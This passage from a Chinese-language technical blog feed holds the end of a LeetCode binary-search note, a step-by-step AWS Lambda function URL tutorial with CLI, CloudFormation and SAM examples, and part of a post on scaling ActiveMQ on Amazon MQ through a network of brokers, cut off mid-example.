1 即為目標值的最後一個位置。這時候我們只需要檢查 nums[left - 1] 是否等於目標值即可。</li></ul><h3 id="特殊狀況"><a href="#特殊狀況" class="headerlink" title="特殊狀況"></a>特殊狀況</h3><ul><li>陣列中所有元素都大於目標值：這種情況下，最終 left 會等於 0，此時說明目標值不存在於陣列中。</li><li>陣列中所有元素都小於目標值：這種情況下，最終 left 會等於陣列長度，目標值應該插入在陣列的最後位置。</li></ul><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/BS_upper_result.png"></p><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>執行步驟數 N -&gt; 1&#x2F;2 N -&gt; 1&#x2F;4 N -&gt; 1&#x2F;8 N … 隨著 $Log n$ 函數收斂到定值</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Search </tag>
            
            <tag> LeetCode </tag>
            
            <tag> Array </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建立 Lambda 函數 URL 的步驟</title>
      <link href="/posts/421a206a.html"/>
      <url>/posts/421a206a.html</url>
      
        <content type="html"><![CDATA[<h1 id="甚麼是-Lambda-URL"><a href="#甚麼是-Lambda-URL" class="headerlink" title="甚麼是 Lambda URL ?"></a>甚麼是 Lambda URL ?</h1><blockquote><p>官方定義: 函數 URL 是 Lambda 函數專用的 HTTP(S) 端點。您可以透過 Lambda 主控台或 Lambda API 建立及設定函數 URL。當您建立函數 URL 時，Lambda 會自動為您產生不重複的 URL 端點。函數 URL 一旦建立，其 URL 端點便永遠不會變更。</p></blockquote><p>函數 URL 端點的格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;url-id&gt;.lambda-url.&lt;region&gt;.on.aws</span><br></pre></td></tr></table></figure><p>要特別注意的是，某些region並不支援使用 function URL，這時可能就要用老方法: API Gateway + Lambda Integration</p><h2 id="存取控制"><a href="#存取控制" class="headerlink" title="存取控制"></a>存取控制</h2><p>在建立 function URL 的時候可以透過 <code>AuthType</code> 參數，來決定 Lambda 如何對 funcion URL 的請求執行身分驗證或授權</p><p>AuthType 選項:</p><ul><li><code>AWS_IAM</code> : 　如果想讓已完成身分驗證的使用者或Role透過function URL 呼叫你的函數，就要選 <code>AWS_IAM</code></li><li><code>NONE</code>:   Lambda 不會在呼叫函數前執行任何身分驗證，但Lambda Function 的Resource Policy永遠有效，還是必須要授予存取權，Function URL 才能接收請求。</li></ul><blockquote><p>細節可以參考<a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/urls-auth.html">這裡</a></p></blockquote><h1 id="如何建立-Lambda-URL"><a href="#如何建立-Lambda-URL" class="headerlink" title="如何建立 Lambda URL?"></a>如何建立 Lambda URL?</h1><h2 id="建立-Execution-Role"><a href="#建立-Execution-Role" class="headerlink" title="建立 Execution Role"></a>建立 Execution Role</h2><p>－ 建立一個具有 <code>AWSLambdaBasicExecutionRole</code> 權限 的 Role</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;Version&quot; : &quot;2012-10-17&quot;,</span><br><span class="line">  &quot;Statement&quot; : [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;Effect&quot; : &quot;Allow&quot;,</span><br><span class="line">      &quot;Action&quot; : [</span><br><span class="line">        &quot;logs:CreateLogGroup&quot;,</span><br><span class="line">        &quot;logs:CreateLogStream&quot;,</span><br><span class="line">        &quot;logs:PutLogEvents&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;Resource&quot; : &quot;*&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/AWS/Lambda_URL/execution_role.png"></p><ul><li>註記 role ARN:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Role ARN: arn:aws:iam::1XXXXXXXXXXX:role/Lambda-URL_Role</span><br></pre></td></tr></table></figure></li></ul><h2 id="建立具有函數-URL-的-Lambda-函數-zip-封存檔"><a href="#建立具有函數-URL-的-Lambda-函數-zip-封存檔" class="headerlink" title="建立具有函數 URL 的 Lambda 函數 (.zip 封存檔)"></a>建立具有函數 URL 的 Lambda 函數 (.zip 封存檔)</h2><ol><li>Write Function Code</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">handler</span> = <span class="keyword">async</span> (event) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(event.<span class="property">body</span>);</span><br><span class="line">    <span class="keyword">const</span> product = body.<span class="property">num1</span> * body.<span class="property">num2</span>;</span><br><span class="line">    <span class="keyword">const</span> response = &#123;</span><br><span class="line">        <span class="attr">statusCode</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">body</span>: <span class="string">&quot;The product of &quot;</span> + body.<span class="property">num1</span> + <span class="string">&quot; and &quot;</span> + body.<span class="property">num2</span> + <span class="string">&quot; is &quot;</span> + product,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="2"><li>Create deployment packages</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip function.zip index.js</span><br></pre></td></tr></table></figure><ol start="3"><li>使用 <code>create-function</code> 命令建立一個 Lambda 函數。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws lambda create-function \</span><br><span class="line">    --function-name my-url-function \</span><br><span class="line">    --runtime nodejs18.x \</span><br><span class="line">    --zip-file fileb://function.zip \</span><br><span class="line">    --handler index.handler \</span><br><span class="line">    --role arn:aws:iam::1XXXXXXXXXXX:role/Lambda-URL_Role</span><br></pre></td></tr></table></figure><p><img src="/img/AWS/Lambda_URL/deployment_package.png"></p><ol start="4"><li>將 resource policy 新增至授予許可的函數，以允許公開存取函數 URL。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws lambda add-permission \</span><br><span class="line">    --function-name my-url-function \</span><br><span class="line">    --action lambda:InvokeFunctionUrl \</span><br><span class="line">    --principal &quot;*&quot; \</span><br><span class="line">    --function-url-auth-type &quot;NONE&quot; \</span><br><span class="line">    --statement-id url</span><br></pre></td></tr></table></figure><blockquote><p>因為是測試方便所以選 NONE，但最好還是要提供AWS_IAM驗證</p></blockquote><p>Return policy</p><p><img src="/img/AWS/Lambda_URL/return_policy.png"></p><ol start="5"><li>使用 <code>create-function-url-config</code> 命令為函數建立 URL 端點</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws lambda create-function-url-config \</span><br><span class="line">    --function-name my-url-function \</span><br><span class="line">    --auth-type NONE</span><br></pre></td></tr></table></figure><p>Return Endpoint</p><p><img src="/img/AWS/Lambda_URL/return_endpoint.png"></p><p>Endpoint:  <a href="https://xxxxxxxxxxuxxxxxxxxxxxxxxxxxxxxxx.lambda-url.us-east-1.on.aws/">https://xxxxxxxxxxuxxxxxxxxxxxxxxxxxxxxxx.lambda-url.us-east-1.on.aws/</a></p><h2 id="測試端點"><a href="#測試端點" class="headerlink" title="測試端點"></a>測試端點</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;https://abcdefg.lambda-url.us-east-1.on.aws/&#x27; \</span><br><span class="line">-H &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">-d &#x27;&#123;&quot;num1&quot;: &quot;10&quot;, &quot;num2&quot;: &quot;10&quot;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/AWS/Lambda_URL/test_endpoint.png"></p><h2 id="建立函數-URL-的-CloudFormation"><a href="#建立函數-URL-的-CloudFormation" class="headerlink" title="建立函數 URL 的 CloudFormation"></a>建立函數 URL 的 CloudFormation</h2><p>下面是用於建立 Function URL 的CFN YAML檔，可以輕鬆建立對應資源:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Resources:</span></span><br><span class="line">  <span class="attr">MyUrlFunction:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Lambda::Function</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Handler:</span> <span class="string">index.handler</span></span><br><span class="line">      <span class="attr">Runtime:</span> <span class="string">nodejs18.x</span></span><br><span class="line">      <span class="attr">Role:</span> <span class="string">arn:aws:iam::123456789012:role/lambda-url-role</span></span><br><span class="line">      <span class="attr">Code:</span></span><br><span class="line">        <span class="attr">ZipFile:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          exports.handler = async (event) =&gt; &#123;</span></span><br><span class="line"><span class="string">              let body = JSON.parse(event.body);</span></span><br><span class="line"><span class="string">              const product = body.num1 * body.num2;</span></span><br><span class="line"><span class="string">              const response = &#123;</span></span><br><span class="line"><span class="string">                  statusCode: 200,</span></span><br><span class="line"><span class="string">                  body: &quot;The product of &quot; + body.num1 + &quot; and &quot; + body.num2 + &quot; is &quot; + product,</span></span><br><span class="line"><span class="string">              &#125;;</span></span><br><span class="line"><span class="string">              return response;</span></span><br><span class="line"><span class="string">          &#125;;</span></span><br><span class="line"><span class="string"></span>      <span class="attr">Description:</span> <span class="string">Create</span> <span class="string">a</span> <span class="string">function</span> <span class="string">with</span> <span class="string">a</span> <span class="string">URL.</span></span><br><span class="line">  <span class="attr">MyUrlFunctionPermissions:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Lambda::Permission</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">FunctionName:</span> <span class="type">!Ref</span> <span class="string">MyUrlFunction</span></span><br><span class="line">      <span class="attr">Action:</span> <span class="string">lambda:InvokeFunctionUrl</span></span><br><span class="line">      <span class="attr">Principal:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">      <span class="attr">FunctionUrlAuthType:</span> <span class="string">NONE</span></span><br><span class="line">  <span class="attr">MyFunctionUrl:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">AWS::Lambda::Url</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">TargetFunctionArn:</span> <span class="type">!Ref</span> <span class="string">MyUrlFunction</span></span><br><span class="line">      <span class="attr">AuthType:</span> <span class="string">NONE</span></span><br></pre></td></tr></table></figure><h2 id="建立具有函數-URL-的-Lambda-函數-AWS-SAM"><a href="#建立具有函數-URL-的-Lambda-函數-AWS-SAM" class="headerlink" title="建立具有函數 URL 的 Lambda 函數 (AWS SAM)"></a>建立具有函數 URL 的 Lambda 函數 (AWS SAM)</h2><p>而這個是可以透過SAM 建立資源的YAML檔</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ProductFunction:</span></span><br><span class="line">  <span class="attr">Type:</span> <span class="string">AWS::Serverless::Function</span></span><br><span class="line">  <span class="attr">Properties:</span></span><br><span class="line">    <span class="attr">CodeUri:</span> <span class="string">function/.</span></span><br><span class="line">    <span class="attr">Handler:</span> <span class="string">index.handler</span></span><br><span class="line">    <span class="attr">Runtime:</span> <span class="string">nodejs18.x</span></span><br><span class="line">    <span class="attr">AutoPublishAlias:</span> <span class="string">live</span></span><br><span class="line">    <span class="attr">FunctionUrlConfig:</span></span><br><span class="line">      <span class="attr">AuthType:</span> <span class="string">NONE</span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-urls.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/lambda-urls.html</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/urls-tutorial.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/urls-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> Lambda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>橫向擴展ActiveMQ</title>
      <link href="/posts/b509904.html"/>
      <url>/posts/b509904.html</url>
      
        <content type="html"><![CDATA[<h2 id="Amazon-MQ"><a href="#Amazon-MQ" class="headerlink" title="Amazon MQ"></a>Amazon MQ</h2><p>Amzon MQ 上有託管 Active MQ 這個訊息佇列的服務，近期有碰到問題是問說，<strong>要怎麼樣在 Amazon MQ 上做 Horizontal Scaling</strong>，</p><p>首先簡單解釋一下 Vertical Scaling 跟 Horizontal Scaling 的差異。</p><p>Scaling意味著擴展，Vertical Scaling著重於單一實體的運算能力增強，所以Vertical Scaling可能會是更好的 CPU&#x2F;GPU,更大的記憶體容量等等，</p><p>以 AWS 服務來說，可能會是更換實例，MQ的話就會是從 <code>t3.Micro</code> 換成 <code>m5.large</code></p><blockquote><p>[+] 執行個體類型 - <a href="https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html">https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html</a></p></blockquote><p>而若要水平擴展，通常代表架構會接收到更多消息，所以會需要根據流量&#x2F;訊息量來去擴展並且分擔單一實例的負擔。</p><h2 id="ActiveMQ-代理網路（Network-of-brokers）"><a href="#ActiveMQ-代理網路（Network-of-brokers）" class="headerlink" title="ActiveMQ 代理網路（Network of brokers）"></a>ActiveMQ 代理網路（Network of brokers）</h2><p>這是一個 ActiveMQ 的原生功能，代理網路包含了多個連接在一起的 Brokers，代理程式之間可共享所代管 client 端以及目標資訊，代理程式之間可以透過網路來路由資訊。</p><p>代理程式可以是：</p><ul><li>Single Instance Broker (節點失敗會無法使用，除非重新啟動)</li><li>Active&#x2F;Standby Brokers (網路中有待命模式的 broker，可以共用儲存空間，若Active 節點失敗，則由 Standby 接管)</li></ul><p>一般來說，若有 Horizontal Scaling的需求，會使用代理網路</p><blockquote><p>[+] Amazon MQ 代理程式網路 - <a href="https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/network-of-brokers.html">https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/network-of-brokers.html</a></p></blockquote><p>下面會逐步帶建構的步驟</p><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p><img src="/img/ActiveMQ/ActiveMQ1.png"></p><p><img src="/img/ActiveMQ/ActiveMQ2.png"></p><p><img src="/img/ActiveMQ/ActiveMQ3.png"></p><p><img src="/img/ActiveMQ/ActiveMQ4.png"></p><p>選擇 <strong>Next</strong></p><p><img src="/img/ActiveMQ/ActiveMQ5.png"></p><p>這時可以下載 CloudFormation 模板，未來可以方便修改配置重新部署</p><p>預估部署所需時間： <strong>25 minutes</strong></p><p><img src="/img/ActiveMQ/ActiveMQ6.png"></p><p>可以發現三個 Broker 都正在部署中</p><p><img src="/img/ActiveMQ/ActiveMQ7.png"></p><p>可以點進去 broker 查看詳細的設定配置</p><p><img src="/img/ActiveMQ/ActiveMQ8.png"></p><p>在設定檔當中可以透過編輯 <code>&lt;networkConnector&gt;&lt;/networkConnector&gt;</code> 當中的屬性進行 MQ 拓墣上的設計</p><p>以下是目前建立的 Broker的設定</p><ul><li>Broker1 上面的 <networkConnectors> 設置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;networkConnectors&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">  &lt;/networkConnectors&gt;</span><br></pre></td></tr></table></figure><ul><li>Broker2 上面的 <networkConnectors> 設置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;networkConnectors&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker3&quot; uri=&quot;masterslave:(ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-1.mq.us-east-1.amazonaws.com:61617,ssl://b-52af7fc7-4bb2-4c0d-b427-11a1c965434f-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">  &lt;/networkConnectors&gt;</span><br></pre></td></tr></table></figure><ul><li>Broker3 上面的 <networkConnectors> 設置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;networkConnectors&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker1&quot; uri=&quot;masterslave:(ssl://b-853601ab-b005-4305-b511-283b560a6ddb-1.mq.us-east-1.amazonaws.com:61617,ssl://b-853601ab-b005-4305-b511-283b560a6ddb-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;false&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;QueueConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;topic physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">    &lt;networkConnector conduitSubscriptions=&quot;true&quot; consumerTTL=&quot;1&quot; messageTTL=&quot;-1&quot; name=&quot;TopicConnectorConnectingToBroker2&quot; uri=&quot;masterslave:(ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-1.mq.us-east-1.amazonaws.com:61617,ssl://b-88e0e40a-d67a-4476-ac04-9015b4a491e5-2.mq.us-east-1.amazonaws.com:61617)&quot; userName=&quot;Kevin&quot;&gt;</span><br><span class="line">      &lt;excludedDestinations&gt;</span><br><span class="line">        &lt;queue physicalName=&quot;&amp;gt;&quot;/&gt;</span><br><span class="line">      &lt;/excludedDestinations&gt;</span><br><span class="line">    &lt;/networkConnector&gt;</span><br><span class="line">  &lt;/networkConnectors&gt;</span><br></pre></td></tr></table></figure><h3 id="conduitSubscriptions-屬性"><a href="#conduitSubscriptions-屬性" class="headerlink" title="conduitSubscriptions 屬性"></a>conduitSubscriptions 屬性</h3><p>根據 ActiveMQ 官方文件 </p><blockquote><p><a href="https://activemq.apache.org/networks-of-brokers">https://activemq.apache.org/networks-of-brokers</a></p></blockquote><p><img src="/img/ActiveMQ/ActiveMQ9.png"></p><p>訂閱相同目的地的多位消費者被網路視為一個消費者，這是為了避免有收到相同消息的狀況</p><p>ActiveMQ 會依賴有關活動消費者（訂閱者）的資訊來在網絡中傳遞訊息，<strong>使用 Conduit Subscription時，如果有多個遠端訂閱，遠程代理將每個消息的副本視為有效，這可能導致訊息重復的狀況產生</strong>。</p><p>因此，預設的 Conduit 行為會去<strong>整合所有匹配的訂閱訊息，以防止在網絡中傳播重複</strong>。</p><p>這樣，遠程代理上的 <code>N</code> 個訂閱看起來對於網絡代理來說就像是一個單一的訂閱。</p><blockquote><p>然而，如果只使用 Queue，重複的訂閱是一個有用的功能，因為負載平衡算法將嘗試均勻分配消息負載，僅當 <code>conduitSubscriptions=false</code> 時，跨網絡的消費者才會均勻分享消息負載。</p></blockquote><p>舉例來說，有兩個代理，A 和 B，它們通過一個 proxy bridge 相互連接。</p><p>連接到代理 A 的消費者訂閱一個名為 <code>Q.TEST</code> 的Queue，連接到代理 B 